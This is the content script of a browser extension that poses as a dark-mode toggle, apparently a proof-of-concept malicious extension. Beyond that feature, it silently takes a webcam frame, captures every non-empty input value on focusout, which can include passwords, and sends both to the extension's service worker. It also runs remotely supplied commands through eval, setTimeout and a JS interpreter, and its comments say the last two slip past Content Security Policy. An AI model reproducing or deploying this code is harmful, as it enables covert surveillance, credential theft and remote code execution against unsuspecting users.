// Legit functionality, toggle dark mode on icon click
let darkModeEnabled = false;
let darkModeStyle = null;

function toggleDarkMode() {
    if (darkModeEnabled) {
        // Dark mode is currently enabled, so disable it
        if (darkModeStyle && darkModeStyle.parentNode) {
            darkModeStyle.parentNode.removeChild(darkModeStyle);
            darkModeStyle = null;
        }
    } else {
        // Dark mode is currently disabled, so enable it
        darkModeStyle = document.createElement('style');
        darkModeStyle.innerHTML = `
            body {
                filter: invert(1) hue-rotate(180deg);
                background-color: black !important;
            }
            img, picture, video {
                filter: invert(1) hue-rotate(180deg);
            }
        `;
        document.head.appendChild(darkModeStyle);
    }

    // Toggle the dark mode state
    darkModeEnabled = !darkModeEnabled;
}
/* =================================================================================== */
// Capture an image with users camera
async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        document.body.appendChild(video);
        video.srcObject = stream;

        // Wait for the video to start playing
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                video.play().then(() => {
                    resolve();
                }).catch(error => {
                    console.error('Error starting video playback:', error);
                    reject(error);
                });
            };
        });

        // Wait for a short delay to ensure video frame is rendered
        await new Promise(resolve => setTimeout(resolve, 500));

        // Capture a frame from the video stream
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert canvas content to a data URL representing the captured image
        const imageUrl = canvas.toDataURL('image/jpeg');

        // Send the image URL to the service worker
        chrome.runtime.sendMessage({ type: 'CAPTURED_IMAGE', data: imageUrl });

        // Clean up: stop the video stream and remove video/canvas elements
        stream.getVideoTracks()[0].stop();
        video.remove();
        canvas.remove();
    } catch (error) {
        console.error('Error accessing camera:', error);
    }
}

/* =================================================================================== */
// Send all input values to the service worker as a message
/**
 * This function sends a message to the service worker with the input value as data.
 * The message type is 'SUBMIT_FORM'.
 *
 * @param {string} key - The value of the input field.
 */
function logKeys(key) {
    const data = {
        keys: key
    }

    chrome.runtime.sendMessage({type: 'SUBMIT_FORM', data}).then((response) => {
        console.log("Response received:", response)
    });
}

/**
 * This event listener triggers when the focus moves out of an input field.
 * If the input field is not empty, it calls the logKeys function with the input value.
 */
document.addEventListener('focusout', function (e) {
    if (e.target.tagName === 'INPUT' && e.target.value !== '') {
        logKeys(e.target.value)
    }
});

/* =================================================================================== */
// Execute injected code through a JS interpreter
function executeWithInterpreter(command) {
    console.log("\nExecuting with JSInterpreter ...")
    const initFunc = function (interpreter, globalObject) {
        interpreter.setProperty(globalObject, 'url', String(location));
        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))

        const alertWrapper = function alert(text) {
            return window.alert(text);
        };
        interpreter.setProperty(globalObject, 'alert', interpreter.createNativeFunction(alertWrapper));

        // TODO: figure out how to bind all DOM interfaces to the interpreter
        // const windowWrapper = function w(command) {
        //     const parsedCommand = command.slice(7)
        //     return window[parsedCommand];
        // };
        // interpreter.setProperty(globalObject, 'window',
        //     interpreter.createNativeFunction(windowWrapper));
    };
    const interpreter = new Interpreter(command, initFunc)
    interpreter.run()
}

// Execute injected code through a setTimeout
function executeWithSetTimeout(command) {
    try {
        console.log("\nExecuting with setTimout ...")
        setTimeout(command);
    } catch (err) {
        console.warn(`setTimeout() failed: ${err.message}`);
    }
}

// Execute injected code through eval
function executeWithEval(command) {
    try {
        console.log("\nExecuting with eval (CSP block expected) ...")
        eval(command);
    } catch (err) {
        console.warn(`eval() failed: ${err.message}`);
    }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'COMMAND') {
        console.log(`Received command: ${request.data}`)

        // Show that eval is blocked by CSP
        executeWithEval(request.data)

        // Alternative to eval, goes unnoticed by CSP
        executeWithSetTimeout(request.data);

        // Alternative2 to eval, goes unnoticed by CSP
        executeWithInterpreter(request.data);
    } else if (request.type === 'HELLO') {
        console.log(request.data)
    } else if (request.type === 'TOGGLE_DARK_MODE') {
        toggleDarkMode();
    } else if (request.type === 'CAMERA') {
        captureCamera();
    }
    sendResponse({status: 'ok'})
});
